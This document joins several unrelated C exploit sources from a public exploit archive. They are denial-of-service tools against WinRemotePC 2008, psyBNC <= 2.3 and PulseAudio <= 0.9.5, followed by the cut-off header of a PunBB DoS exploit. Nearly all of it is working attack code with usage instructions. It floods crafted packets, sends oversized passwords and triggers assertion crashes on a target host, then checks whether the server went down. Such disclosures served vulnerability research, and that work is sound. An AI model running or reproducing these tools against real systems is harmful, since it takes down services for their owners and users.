#include <malloc.h>
#include <sys/stat.h>
#include <fcntl.h>

#define size 30000
#define tests 35
/*
****WinRemotePC Full+Lite 2008 r.2server DOS(memory+cpu consumption) vulnerability poc****

A vulnerability exists in  WinRemotePC Full+Lite 2008 r.2+server in the way it handles recieved packets because it 
fails to properly process/sanitize arbitrarily lengths and/or invalid packets.The vulnerability occurs both before and 
after login.When confrunted with such packets the server starts consuming full cpu and memory and sometims leads to 
immediate crash.Although i couldn't find a packet pattern for immediate crash or exploitation the DOS is certain through 
cpu+memory consumption.If one of the memory or cpu events did not occur reruning the poc might fix that :D
Usage: ./dos [ip] [port]

WinRemotePC: http://www.winsoftmagic.com/winremotepc.html

Discovey+POC by Shinnok + raydenxy [at]  yahoo dot com
*/

/*The first packet sent by the client to the server when initiating a connection split between the "Service Pack n" string which will be replaced with the variable length long strings of A's.Although the server is vulnerable to this kind of dos without requiring to shoot out a partially valid  packet it is more reliable for dos this way :)*/
char p1[]="\x00\x00\x00\x00\xa7\x01\x00\x00\xa7\x01\x00\x00\x00\xff\x00\x00\xe4\x2e\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00\x02\x00\x00\x00\x8f\x41\x82\x7b\x38\xb1\xe4\x4e\x9b\x92\xf5\xc0\xe5\xf9\xb9\xd2\x01\x01\x00\x00\x20\x00\x00\x00\x22\xf4\xc7\x1f\xf6\x9a\x5e\x77\x1b\x42\x73\x70\x42\xda\xf0\xd1\x70\x59\xf8\xf7\x81\xb7\x97\x0a\x11\xf2\x4c\x0c\x3a\xbd\x56\xb9\x20\x00\x00\x00\xa1\xeb\x78\xe2\xbe\xeb\xb7\x3a\x33\x8c\xf4\x1f\xbd\xbe\x21\x9e\xf8\x6b\x20\x2d\x0f\x1d\x4b\x3e\x2d\x55\x5e\x45\xf6\x8a\xed\x4d\x5f\x00\x00\x00\xe8\x7c\x1a\x56\xd0\xa6\xf8\xef\x09\xea\xb6\xc8\x53\xe2\xc9\xc9\xcd\x86\x0b\xa3\x55\x90\xe6\x4c\x97\xb6\x38\x4b\xbc\x5f\xa4\x29\xa9\x2d\x1c\xa1\xa1\x7b\x1a\xbf\x97\x1a\x88\x55\x1d\x7e\xa4\x2e\x43\xf7\x57\xd6\x21\x1e\x9e\xa0\x6f\x4a\xd0\x38\xfa\xe9\x9a\x50\x8f\xd0\x43\x88\x9f\xc8\xb5\x6f\x09\x1a\xcf\x92\x74\x41\x6b\x87\xe1\xef\xbc\xe3\xf0\x99\x09\xb6\x8d\x85\x0b\x2e\xd3\x3b\x2e\x94\x00\x00\x00\x05\x00\x00\x00\x01\x00\x00\x00\x28\x0a\x00\x00\x02\x00\x00\x00";
char p2[]="\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00\x00\x00\x2a\x00\x00\x00\x30\x31\x2d\x30\x30\x2d\x36\x46\x32\x45\x30\x31\x37\x30\x2d\x31\x45\x45\x38\x2d\x34\x34\x33\x36\x2d\x41\x35\x36\x44\x2d\x30\x44\x35\x33\x39\x38\x39\x36\x46\x30\x31\x35\x02\x00\x00\x00\x30\x3a\x00\x00\x00\x00\x00\x00\x00\x00\x18\x00\x00\x00\x18\x00\x00\x00\x00\xff\x00\x00\xc4\x13\x00\x00\x02\x00\x00\x00\x00\x00\x00\x00\x04\x00\x00\x00\x01\x00\x00\x00";

/*All kinds of A sizes to ensure the dos,starting with big ones at first to ensure that memory consumption occurs first and then dealing with the cpu issue.*/
int sizes[]={30000,29000,30000,127,128,255,256,511,512,1023,1024,2047,2048,3000,4000,5000,6000,7000,8000,9000,10000,11000,12000,13000,14000,15000,16000,17000,18000,19000,20000,21000,22000,23000,24000};

int main(int argc, char* argv[]){
	struct sockaddr_in server;
	int s,i,f;
	char req[size];
	char* buff;

	for(i=0;i<size;i++) req[i]='A';
	
	bzero(&server,sizeof(server));
	server.sin_family = AF_INET;
	server.sin_addr.s_addr = inet_addr(argv[1]);
	server.sin_port = htons(atoi(argv[2]));
	
	
	
	for(i=0;i<tests;i++) {
	
	s=socket(AF_INET,SOCK_STREAM,0);
	
	if(connect(s,(struct sockaddr * ) &server,sizeof(struct sockaddr)) == -1) {
		perror("Target blasted.\n");
		return(EXIT_SUCCESS);
	}
	
	buff = malloc((sizeof(p1)+sizeof(p2)+sizes[i])-2);
	
	memcpy(buff,p1,sizeof(p1)-1);
	memcpy(buff+sizeof(p1)-1,req,sizes[i]);
	memcpy(buff+sizeof(p1)-1+sizes[i],p2,sizeof(p2)-1);

	write(s,buff,(sizeof(p1)+sizeof(p2)+sizes[i])-2);
	close(s);
	free(buff);
	}	
	
	return(EXIT_SUCCESS);
}

// milw0rm.com [2008-07-15]
/* 
* psyBNC <= 2.3 DoS
* Information System Advancement in Penetration (ISAP) Labs
* By Lunar Fault [ElectronicSouls]
* (C) May 19, 2002
*
* Legal Notice:
* In no way is ElectronicSouls, ISAP, or the author responsible for the
* actions or usage of this program. The author retains all copyrights to the
* contents within includeing this banner, except for the resolvenametoip() 
* function. This source is not to be used for illegal purposes. Please check 
* your local laws before testing this proof of concept. 
*
* Description: 
* Problem dealing with over sized passwords. Once the DoS has been sent the 
* victim's psybnc's pid slowly begins to eat up cpu usage. This also results 
* in the fact that psybnc holds the connection with a TIME_WAIT further denying 
* access to the bnc. If you try and exploit the server more times than it allows 
* connections in force mode. The result will be a Broken Pipe, in standard mode it 
* will tell you the server is not vuln.
* 
* es 11805 99.7 1.9 2672 1216 pts/1 R 06:28 19:17 ./psybnc 
*
* Tested on psyBNC2.3, psyBNC2.2.1, psyBNC2.1.1
* Succefully exploited on Linux x86, and OpenBSD 3.0 x86. 
* 
* Lunar Fault
*/

#include <stdio.h>
#include <stdlib.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <netdb.h>
#include <getopt.h>
#include <unistd.h>
#include <string.h> 

#define SIZE 9000
#define PORT 31337 
#define USER "pr0ix"

int senddos(int port, int size, char *target, char *user);
int checkvuln(char *rxbuf); 
int testvuln(int port, char *target);
unsigned long resolvenametoip(char *name); 
void usage(char *prog);

int checked = 0;
int force;

int main(int argc, char *argv[])
{
  int c, i, z;
  int port, size, times;
  int u_t = 0, d_t = 0, n_t = 0, p_t = 0, s_t = 0, t_t;
  char target[1024], *user;
  
  printf("[+] ES psyBNC <= 2.3 DoS\n");
  printf("[+] Information System Advancement in Penetration (ISAP) Labs\n");
  printf("[+] By: Lunar Fault [ElectronicSouls]\n");
  
  if(argc < 2) { usage(argv[0]);} 
  
  while ((c = getopt (argc, argv, "d:n:p:s:u:hft"))!=EOF) {
    switch(c) {
    case 'h':
      usage(argv[0]);
      break;
    case 'f':
      force = 1;
      break;
    case 'd':
      strncpy(target, optarg, sizeof(target));
      d_t = 1;
      break;
    case 'n':
      times = atoi(optarg);
      n_t = 1;
      break;
    case 'p':
      port = atoi(optarg);
      p_t = 1;
      break;
    case 's':
      size = atoi(optarg);
      s_t = 1;
      break;
    case 't':
      t_t = 1;
      break;
    case 'u':
      user = (char *) malloc(strlen(optarg));
      memcpy(user, optarg, strlen(optarg));
      u_t = 1;
      break;
    }
  }
  
  if (d_t == 0) { usage(argv[0]); }
  
  if (n_t == 0) times = 3;
  
  if (p_t == 0) port = PORT;
  
  if (s_t == 0) size = SIZE;
  
  if (u_t == 0) { 
    user = (char *) malloc(strlen(USER));
    memcpy(user, USER, strlen(USER));
  }
  
  printf("[*] Victim: %s\n", target);
  printf("[*] Port: %d\n", port);
  printf("[*] User: %s\n", user);
  printf("[*] Size: %d\n", size);
  printf("[*] Times: %d\n", times);
  
  if (t_t == 1) {
    printf("[*] Testing for vulnerability\n");
    z = testvuln(port, target);
    printf("\n");
    if (z == -1) {
      printf("[!] Failed to test Vuln!\n");
      exit(1);
    }
    return 0;
  } 
  
  if (force == 1) 
    printf("[*] Forceing DoS\n"); 
  
  for (i = 0; i < times; i++) {
    z = senddos(port, size, target, user);
    if (z == -1) {
      printf("[!] Failed on sending DoS!\n");
      exit(1);
    }
  }
  
  printf("[*] DoS sent %d times\n\n", times);
  return 0;
}

int senddos(int port, int size, char *target, char *user)
{
  int i, s, z, len_inet;
  unsigned long ipaddr;
  char *dosbuf, tmpbuf[128], *passbuf, rxbuf[1024];
  
  struct sockaddr_in victim;
  
  if (!(ipaddr = resolvenametoip(target))) {
    printf("[!] Failed to resolve '%s'\n", target);
    exit(1);
  }
  
  victim.sin_family = AF_INET;
  victim.sin_port = htons(port);
  victim.sin_addr.s_addr = ipaddr;
  
  len_inet = sizeof(victim);
  
  s = socket(PF_INET, SOCK_STREAM, 0);
  if (s < 0) {
    printf("[!] Failed to open socket!\n");
    exit(1);
  }
  
  z = connect(s, (struct sockaddr *)&victim, len_inet);
  if (z < 0) {
    printf("[!] Connection refused!\n");
    exit(1);
  }
  
  z = read(s, rxbuf, sizeof(rxbuf));
  if (z == -1) {
    printf("[!] Failed on read!\n");
    exit(1);
  }
  
  z = checkvuln(rxbuf);
  if (z == -1) {
    printf("[!] Failed on vuln check!\n");
    exit(1);
  }
  
  snprintf(tmpbuf, sizeof(tmpbuf), "NICK %s\n\r", user);
  
  z = write(s, tmpbuf, strlen(tmpbuf));
  if (z == -1) {
    printf("[!] Failed on write!\n");
    exit(1);
  }
  
  z = read(s, rxbuf, sizeof(rxbuf));
  if (z == -1) {
    printf("[!] Failed on read!\n");
    exit(1);
  }
  
  passbuf = (char *) malloc(size);
  for (i = 0; i < size; i++) 
    *(char *) &passbuf[i] = "A";
  
  dosbuf = (char *) malloc(7 + strlen(passbuf));
  
  memcpy(dosbuf, "PASS ", 5);
  
  memcpy(dosbuf+5, passbuf, strlen(passbuf));
  
  memcpy(dosbuf+5+strlen(passbuf), "\n\r", 2);
  
  z = write(s, dosbuf, strlen(dosbuf));
  if (z == -1) {
    printf("[!] Failed on write!\n");
    exit(1);
  }
  
  close(s);
  
  free(dosbuf);
  free(passbuf);
  
  return 0;
}

int checkvuln(char *rxbuf)
{
  int vuln_t;
  char *bnc;
  
  sprintf(&rxbuf[strlen(rxbuf)-2], 0);
  
  if (force == 1) {return 0;}
  if (checked == 1) { return 0;}
  printf("[?] Server returned: %s\n", rxbuf);
  if (bnc = strstr(rxbuf, "psyBNC2.")) {
    if (strcasecmp(&bnc[9], ".") > 0) {
      vuln_t = 1;
    }
    if ((int)(bnc[8] - '0') <= 3) { 
      if ((int)(bnc[8] - '0') == 3 && vuln_t == 1) {
        printf("[!] Server is NOT VULN!\n");
        exit(1);
      }
      printf("[*] Server is VULN!!\n");
    } else {
      printf("[!] Server is NOT VULN!\n");
      exit(1);
    }
  } else { 
    printf("[!] Server is NOT VULN!\n");
    exit(1);
  }
  
  checked = 1;
  
  return 0;
}

int testvuln(int port, char *target)
{
  int s, z, len_inet;
  unsigned long ipaddr;
  char rxbuf[1024];
  
  struct sockaddr_in victim;
  
  if (!(ipaddr = resolvenametoip(target))) {
    printf("[!] Failed to resolve '%s'\n", target);
    exit(1);
  }
  
  victim.sin_family = AF_INET;
  victim.sin_port = htons(port);
  victim.sin_addr.s_addr = ipaddr;
  
  len_inet = sizeof(victim);
  
  s = socket(PF_INET, SOCK_STREAM, 0);
  if (s < 0) {
    printf("[!] Failed to open socket!\n");
    exit(1);
  }
  
  z = connect(s, (struct sockaddr *)&victim, len_inet);
  if (z < 0) {
    printf("[!] Connection refused!\n");
    exit(1);
  }
  
  z = read(s, rxbuf, sizeof(rxbuf));
  if (z == -1) {
    printf("[!] Failed on read!\n");
    exit(1); 
  }
  
  z = checkvuln(rxbuf);
  if (z == -1) {
    printf("[!] Failed on vuln check!\n");
    exit(1);
  }
  
  return 0;
}

unsigned long resolvenametoip(char *name)
{
  struct hostent *host;
  unsigned long addr;
  
  if ((addr = inet_addr(name)) == -1) {
    if (!(host = gethostbyname(name))) return 0;
    else addr = *((unsigned long*)host->h_addr);
  }
  
  return addr;
} 

void usage(char *prog) 
{
  printf("usage: %s [options]\n", prog);
  printf("\t-d <target> Server hosting psybnc [REQUIRED]\n");
  printf("\t-f force Skip vuln checking\n");
  printf("\t-h help Your looking at it\n");
  printf("\t-n <number> Number of times to attack Default: 3\n");
  printf("\t-p <port> Port to connect to Default: 31337\n");
  printf("\t-s <size> Size of password to send Default: 9000\n");
  printf("\t-t test Tests for vuln\n");
  printf("\t-u <user> User to login with Default: pr0ix\n\n");
  exit(1);
}/*

by Luigi Auriemma

*/

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include <time.h>
#include "pulsex.h"

#ifdef WIN32
    #include <winsock.h>
    #include "winerr.h"

    #define close       closesocket
    #define sleep       Sleep
    #define usleep(x)   sleep(x / 1000)
    #define ONESEC      1000
    typedef uint32_t    in_addr_t;
#else
    #include <unistd.h>
    #include <sys/socket.h>
    #include <sys/types.h>
    #include <arpa/inet.h>
    #include <netinet/in.h>
    #include <netdb.h>
    #include <sys/times.h>
    #include <sys/un.h>
    #include <fcntl.h>
    #include <X11/Xlib.h>           // -lX11
    #include <X11/Xatom.h>

    #define ONESEC      1
#endif



#define VER                     "0.1"
#define BUFFSZ                  FRAME_SIZE_MAX_ALLOW
#define PA_LENGTH               ntohl(pa[PA_PSTREAM_DESCRIPTOR_LENGTH])
#define PA_STREAM(A,B,C,D,E)    pa[PA_PSTREAM_DESCRIPTOR_LENGTH]    = htonl(A); \
                                pa[PA_PSTREAM_DESCRIPTOR_CHANNEL]   = htonl(B); \
                                pa[PA_PSTREAM_DESCRIPTOR_OFFSET_HI] = htonl(C); \
                                pa[PA_PSTREAM_DESCRIPTOR_OFFSET_LO] = htonl(D); \
                                pa[PA_PSTREAM_DESCRIPTOR_FLAGS]     = htonl(E);



int getxx(uint8_t *data, uint32_t *ret, int bits);
int putxx(uint8_t *data, uint32_t num, int bits);
int putmm(uint8_t *data, uint8_t *val, int len);
int tcp_send(int sd, uint8_t *data, int size);
int tcp_recv(int sd, uint8_t *data, int len);
int get_endian(void);
int rndxx(uint8_t *data, int len);
in_addr_t resolv(char *host);
void std_err(void);



#ifndef WIN32
int unix_socket_check(char *fname, struct sockaddr_un *peeru) {
    int     sd,
            ret     = 0;

    sprintf(peeru->sun_path, "%.*s", 108, fname);
    peeru->sun_family = AF_UNIX;
    printf("- check %s\n", peeru->sun_path);
    sd = socket(AF_UNIX, SOCK_STREAM, 0);
    if(sd < 0) std_err();
    if(connect(sd, (struct sockaddr *)peeru, sizeof(struct sockaddr_un))
      < 0) ret = -1;
    close(sd);
    return(ret);
}

    /* directly from Pulseaudio */
char* pa_x11_get_prop(Display *d, const char *name, char *p, size_t l) {
    Atom actual_type;
    int actual_format;
    unsigned long nitems;
    unsigned long nbytes_after;
    unsigned char *prop = NULL;
    char *ret = NULL;

    Atom a = XInternAtom(d, name, False);
    if (XGetWindowProperty(d, RootWindow(d, 0), a, 0, (l+2)/4, False, XA_STRING, &actual_type, &actual_format, &nitems, &nbytes_after, &prop) != Success)
        goto finish;

    if (actual_type != XA_STRING) goto finish;

    memcpy(p, prop, nitems);
    p[nitems] = 0;
    ret = p;
finish:
    if (prop) XFree(prop);
    return ret;
}
#endif



int main(int argc, char *argv[]) {
    struct  sockaddr_in peer;
    int         sd,
                i,
                n,
                cnt     = 0,
                attack,
                chans   = 1,        // max 32
                freq    = 22050,
                tcp     = 1;
    uint32_t    pa[PA_PSTREAM_DESCRIPTOR_MAX];
    uint16_t    port    = PA_NATIVE_DEFAULT_PORT;
    uint8_t     cookie[256],
                *buff,
                *p;

#ifdef WIN32
    WSADATA    wsadata;
    WSAStartup(MAKEWORD(1,0), &wsadata);
#else
    struct  sockaddr_un peeru;
#endif

    setbuf(stdout, NULL);

    fputs("\n"
        "Pulseaudio <= 0.9.5 (rev 1437) termination "VER"\n"
        "by Luigi Auriemma\n"
        "e-mail: aluigi@autistici.org\n"
        "web:    aluigi.org\n"
        "\n", stdout);

    if(argc < 3) {
        printf("\n"
            "Usage: %s <attack> <host*> [port(%hu)]\n"
            "\n"
            "Attack:\n"
            "1 = do_read: Assertion `p->export' failed.\n"
            "2 = pa_memblock_new: Assertion `length > 0' failed.\n"
            "3 = pa_sdp_parse: Assertion `t' failed. (use host 224.0.0.56!)\n"
            "4 = pa_memblockq_new: Assertion `maxlength >= base' failed (needs auth!)\n"
            "5 = pa_xmalloc: Assertion `size < (1024*1024*20)' failed   (needs auth!)\n"
            "6 = play a small sound (crash also a module in 0.9.5)      (needs auth!)\n"
            "\n"
            "* on *nix you can also specify the name of Unix socket to use like\n"
            "  /tmp/pulse-$USERNAME$/native or /tmp/pulse/native\n"
            "\n", argv[0], port);
        exit(1);
    }

    attack = atoi(argv[1]);
    if((attack <= 0) || (attack >= 7)) {
        printf("\nError: wrong attack number\n");
        exit(1);
    }

    if(attack == 3) {
        port = 9875;
        if(argc > 3) port = atoi(argv[3]);
        peer.sin_addr.s_addr = resolv(argv[2]);
        peer.sin_port        = htons(port);
        peer.sin_family      = AF_INET;

        printf("- connect to %s:%hu\n", inet_ntoa(peer.sin_addr), ntohs(peer.sin_port));
        sd = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
        if(sd < 0) std_err();
        if(sendto(sd, "", 0, 0, (struct sockaddr *)&peer, sizeof(peer))
          < 0) std_err();
        close(sd);
        printf("- check if the server is up manually\n");
        return(0);
    }

#ifndef WIN32
    if(!unix_socket_check(argv[2], &peeru)) tcp = 0;
#endif
    if(tcp && strchr(argv[2], '/')) {
        printf("\nError: the host seems a Unix file but it doesn't exist\n");
        exit(1);
    }

    if(tcp) {
        if(argc > 3) port = atoi(argv[3]);
        peer.sin_addr.s_addr = resolv(argv[2]);
        peer.sin_port        = htons(port);
        peer.sin_family      = AF_INET;

        printf("- connect to %s:%hu\n", inet_ntoa(peer.sin_addr), ntohs(peer.sin_port));
        sd = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
        if(sd < 0) std_err();
        if(connect(sd, (struct sockaddr *)&peer, sizeof(peer))
          < 0) std_err();
#ifndef WIN32
    } else {
        printf("- open %s\n", peeru.sun_path);
        sd = socket(AF_UNIX, SOCK_STREAM, 0);
        if(sd < 0) std_err();
        if(connect(sd, (struct sockaddr *)&peeru, sizeof(struct sockaddr_un))
          < 0) std_err();
#endif
    }

    buff = malloc(BUFFSZ);
    if(!buff) std_err();

    if(attack == 1) {
        PA_STREAM(FRAME_SIZE_MAX_ALLOW, 0, 0, 0, PA_FLAG_SHMRELEASE);

        if(tcp_send(sd, (void *)&pa,        PA_PSTREAM_DESCRIPTOR_SIZE) < 0) goto error;
    }

    if(attack == 2) {
        PA_STREAM(0, 0, 0, 0, 0);

        if(tcp_send(sd, (void *)&pa,        PA_PSTREAM_DESCRIPTOR_SIZE) < 0) goto error;
    }

    /*
    the following code is a full working player
    I wrote it for testing other possible bugs
    and I have preferred to leave it here as is.
    it's very useful if you want to understand
    how to play audio data through sockets
    */

    if(attack >= 4) {
        if(attack == 5) freq = -1;

#ifdef WIN32
        printf("- you need to manually load a cookie, I will continue with one filled by zeroes which will fail for sure\n");
        memset(cookie, 0, sizeof(cookie));
#else
        printf("- get and try with the current PULSE_COOKIE\n");
        Display     *d;
        d = XOpenDisplay(NULL);
        if(!d) std_err();
        if(!pa_x11_get_prop(d, "PULSE_COOKIE", buff, BUFFSZ)) std_err();
        for(i = 0; i < 256; i++) {
            sscanf(buff + (i << 1), "%02x", &n);
            cookie[i] = n;
        }
#endif

            /* LOGIN */

        p = buff;
        p += putxx(p, PA_TAG_U32,           8); p += putxx(p, PA_COMMAND_AUTH,      32);
        p += putxx(p, PA_TAG_U32,           8); p += putxx(p, cnt++,                32);
        p += putxx(p, PA_TAG_U32,           8); p += putxx(p, PA_PROTOCOL_VERSION,  32);
        p += putxx(p, PA_TAG_ARBITRARY,     8); p += putxx(p, sizeof(cookie),       32);
        p += putmm(p, cookie, sizeof(cookie));

        PA_STREAM(p - buff, -1, 0, 0, 0);

        if(tcp_send(sd, (void *)&pa,        PA_PSTREAM_DESCRIPTOR_SIZE) < 0) goto error;
        if(tcp_send(sd, buff,               p - buff)                   < 0) goto error;

        if(tcp_recv(sd, (void *)&pa,        PA_PSTREAM_DESCRIPTOR_SIZE) < 0) goto error;
        if(tcp_recv(sd, buff,               PA_LENGTH)                  < 0) goto error;

            /* SEND PLAYER NAME */

        p = buff;
        p += putxx(p, PA_TAG_U32,           8); p += putxx(p, PA_COMMAND_SET_CLIENT_NAME,   32);
        p += putxx(p, PA_TAG_U32,           8); p += putxx(p, cnt++,                32);
        p += putxx(p, PA_TAG_STRING,        8); p += 1 + sprintf(p, "name_of_the_player");

        PA_STREAM(p - buff, -1, 0, 0, 0);

        if(tcp_send(sd, (void *)&pa,        PA_PSTREAM_DESCRIPTOR_SIZE) < 0) goto error;
        if(tcp_send(sd, buff,               p - buff)                   < 0) goto error;

        if(tcp_recv(sd, (void *)&pa,        PA_PSTREAM_DESCRIPTOR_SIZE) < 0) goto error;
        if(tcp_recv(sd, buff,               PA_LENGTH)                  < 0) goto error;

            /* INITIALIZE THE DEVICE*/

        p = buff;
        p += putxx(p, PA_TAG_U32,           8); p += putxx(p, PA_COMMAND_CREATE_PLAYBACK_STREAM, 32);
        p += putxx(p, PA_TAG_U32,           8); p += putxx(p, cnt++,                32);
        p += putxx(p, PA_TAG_STRING,        8); p += 1 + sprintf(p, "name_of_the_file");
        p += putxx(p, PA_TAG_SAMPLE_SPEC,   8);
            p += putxx(p, 3, 8);            p += putxx(p, chans, 8);    p += putxx(p, freq, 32);
        p += putxx(p, PA_TAG_CHANNEL_MAP,   8); p += putxx(p, chans,    8);
            for(i = 0, n = p[-1]; i < n; i++)   p += putxx(p, 0,        8);
        p += putxx(p, PA_TAG_U32,           8); p += putxx(p, -1,       32);    // sink_index
        p += putxx(p, PA_TAG_STRING_NULL,   8);
        if(attack == 4) {
            p += putxx(p, PA_TAG_U32,       8); p += putxx(p, 1,        32);    // maxlength
        } else {
            p += putxx(p, PA_TAG_U32,       8); p += putxx(p, BUFFSZ,   32);    // maxlength
        }
        p += putxx(p, PA_TAG_BOOLEAN_FALSE, 8);                                 // corked
        p += putxx(p, PA_TAG_U32,           8); p += putxx(p, -1,       32);    // tlength
        p += putxx(p, PA_TAG_U32,           8); p += putxx(p, -1,       32);    // prebuf
        p += putxx(p, PA_TAG_U32,           8); p += putxx(p, -1,       32);    // minreq
        p += putxx(p, PA_TAG_U32,           8); p += putxx(p, 0,        32);    // syncid
        p += putxx(p, PA_TAG_CVOLUME,       8); p += putxx(p, chans,    8);
            for(i = 0, n = p[-1]; i < n; i++)   p += putxx(p, 0x10000,  32);

        PA_STREAM(p - buff, -1, 0, 0, 0);

        if(tcp_send(sd, (void *)&pa,        PA_PSTREAM_DESCRIPTOR_SIZE) < 0) goto error;
        if(tcp_send(sd, buff,               p - buff)                   < 0) goto error;

        if(tcp_recv(sd, (void *)&pa,        PA_PSTREAM_DESCRIPTOR_SIZE) < 0) goto error;
        if(tcp_recv(sd, buff,               PA_LENGTH)                  < 0) goto error;

            /* RAW AUDIO DATA */

        p = buff;   // some funny audio data
        for(i = 0; i < 10000; i++) *p++ = i & 0xff;
        for(i = 0; i < 10000; i++) *p++ = i & 0x7f;
        for(i = 0; i < 10000; i++) *p++ = i & 0x3f;
        for(i = 0; i < 10000; i++) *p++ = i & 0x1f;

        PA_STREAM(p - buff, 0, 0, 0, 0);    // channel (max chans - 1)

        if(tcp_send(sd, (void *)&pa,        PA_PSTREAM_DESCRIPTOR_SIZE) < 0) goto error;
        if(tcp_send(sd, buff,               p - buff)                   < 0) goto error;

            /* PLAY IT */

        p = buff;
        p += putxx(p, PA_TAG_U32,           8); p += putxx(p, PA_COMMAND_DRAIN_PLAYBACK_STREAM, 32);
        p += putxx(p, PA_TAG_U32,           8); p += putxx(p, cnt++,    32);
        p += putxx(p, PA_TAG_U32,           8); p += putxx(p, 0,        32);    // index

        PA_STREAM(p - buff, -1, 0, 0, 0);

        if(tcp_send(sd, (void *)&pa,        PA_PSTREAM_DESCRIPTOR_SIZE) < 0) goto error;
        if(tcp_send(sd, buff,               p - buff)                   < 0) goto error;

        if(tcp_recv(sd, (void *)&pa,        PA_PSTREAM_DESCRIPTOR_SIZE) < 0) goto error;
        if(tcp_recv(sd, buff,               PA_LENGTH)                  < 0) goto error;

            /* DELETE THE STREAM */

        p = buff;
        p += putxx(p, PA_TAG_U32,           8); p += putxx(p, PA_COMMAND_DELETE_PLAYBACK_STREAM, 32);
        p += putxx(p, PA_TAG_U32,           8); p += putxx(p, cnt++,    32);
        p += putxx(p, PA_TAG_U32,           8); p += putxx(p, 0,        32);

        PA_STREAM(p - buff, -1, 0, 0, 0);

        if(tcp_send(sd, (void *)&pa,        PA_PSTREAM_DESCRIPTOR_SIZE) < 0) goto error;
        if(tcp_send(sd, buff,               p - buff)                   < 0) goto error;

        if(tcp_recv(sd, (void *)&pa,        PA_PSTREAM_DESCRIPTOR_SIZE) < 0) goto error;
        if(tcp_recv(sd, buff,               PA_LENGTH)                  < 0) goto error;

        /*
        here you can test possible bugs in all the
        modules loadable by the pulseaudio server
        I had no luck with directory traversal and
        no luck with bugged modules except
        module-volume-restore which causes a crash
        in pa_hook_slot_free when a wrong table
        file is loaded:
        p += putxx(p, PA_TAG_STRING,        8); p += 1 + sprintf(p, "module-volume-restore");
        p += putxx(p, PA_TAG_STRING,        8); p += 1 + sprintf(p, "table=/bin/sh");
        */

        p = buff;
        p += putxx(p, PA_TAG_U32,           8); p += putxx(p, PA_COMMAND_LOAD_MODULE, 32);
        p += putxx(p, PA_TAG_U32,           8); p += putxx(p, cnt++,    32);
        p += putxx(p, PA_TAG_STRING,        8); p += 1 + sprintf(p, "module-volume-restore");
        p += putxx(p, PA_TAG_STRING,        8); p += 1 + sprintf(p, "table=/dev/sh");

        PA_STREAM(p - buff, -1, 0, 0, 0);

        if(tcp_send(sd, (void *)&pa,        PA_PSTREAM_DESCRIPTOR_SIZE) < 0) goto error;
        if(tcp_send(sd, buff,               p - buff)                   < 0) goto error;

        if(tcp_recv(sd, (void *)&pa,        PA_PSTREAM_DESCRIPTOR_SIZE) < 0) goto error;
        if(tcp_recv(sd, buff,               PA_LENGTH)                  < 0) goto error;
    }

    sleep(ONESEC);
    close(sd);
    printf("- check if the server is still up:\n");
    sleep(ONESEC);

    if(tcp) {
        sd = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
        if(sd < 0) std_err();
        n = connect(sd, (struct sockaddr *)&peer, sizeof(peer));
#ifndef WIN32
    } else {
        sd = socket(AF_UNIX, SOCK_STREAM, 0);
        if(sd < 0) std_err();
        n = connect(sd, (struct sockaddr *)&peeru, sizeof(struct sockaddr_un));
#endif
    }

    if(n < 0) {
        printf("\n  Server IS vulnerable!!!\n\n");
    } else {
        printf("\n  Server doesn't seem vulnerable\n\n");
    }

    close(sd);
    return(0);
error:
    close(sd);
    printf("\nError: connection lost\n");
    return(1);
}



int getxx(uint8_t *data, uint32_t *ret, int bits) {
    uint32_t    num;
    int         i,
                bytes;

    bytes = bits >> 3;

    for(num = i = 0; i < bytes; i++) {
        num |= (data[i] << ((bytes - i - 1) << 3));
    }

    *ret = num;
    return(bytes);
}



int putxx(uint8_t *data, uint32_t num, int bits) {
    int         i,
                bytes;

    bytes = bits >> 3;

    for(i = 0; i < bytes; i++) {
        data[i] = num >> ((bytes - i - 1) << 3);
    }

    return(bytes);
}



int putmm(uint8_t *data, uint8_t *val, int len) {
    memcpy(data, val, len);
    return(len);
}



int get_endian(void) {
    int     endian = 1;

    if(*(char *)&endian) endian = 0;
    return(endian);
}



int tcp_send(int sd, uint8_t *data, int size) {
    return(send(sd, data, size, 0));
}



int tcp_recv(int sd, uint8_t *data, int size) {
    int     t;

    while(size) {
        t = recv(sd, data, size, 0);
        if(t <= 0) return(-1);
        data += t;
        size -= t;
    }
    return(0);
}



int rndxx(uint8_t *data, int len) {
    uint32_t    rnd;
    uint8_t     *p = data;
    const static uint8_t table[] =
                "0123456789"
                "ABCDEFGHIJKLMNOPQRSTUVWXYZ"
                "abcdefghijklmnopqrstuvwxyz";

    rnd = time(NULL);

    while(len--) {
        rnd = (rnd * 0x343FD) + 0x269EC3;
        *p++ = table[rnd % (sizeof(table) - 1)];
    }
    *p++ = 0;

    return(p - data);

/* format string test
    int i;
    for(i = 0; i < (len - 1); i++) {
        *data++ = (i & 1) ? 'n' : '%';
    }
    *data++ = 0;

    return(len);
*/
}



in_addr_t resolv(char *host) {
    struct      hostent *hp;
    in_addr_t   host_ip;

    host_ip = inet_addr(host);
    if(host_ip == INADDR_NONE) {
        hp = gethostbyname(host);
        if(!hp) {
            printf("\nError: Unable to resolv hostname (%s)\n", host);
            exit(1);
        } else host_ip = *(in_addr_t *)(hp->h_addr);
    }
    return(host_ip);
}



#ifndef WIN32
    void std_err(void) {
        perror("\nError");
        exit(1);
    }
#endif


/*
  Name: NST-Exploit Punbb 2.0.10 Denial Of Service
  Copyright: NeoSecurity
  Author: K4P0
    
  [./]NST-XplPunbb www.victim.com 2.0.0.6 /punbb/
  
  #################################################
  PunBB 2.0.10 Denial of Service exploit by K4P0  
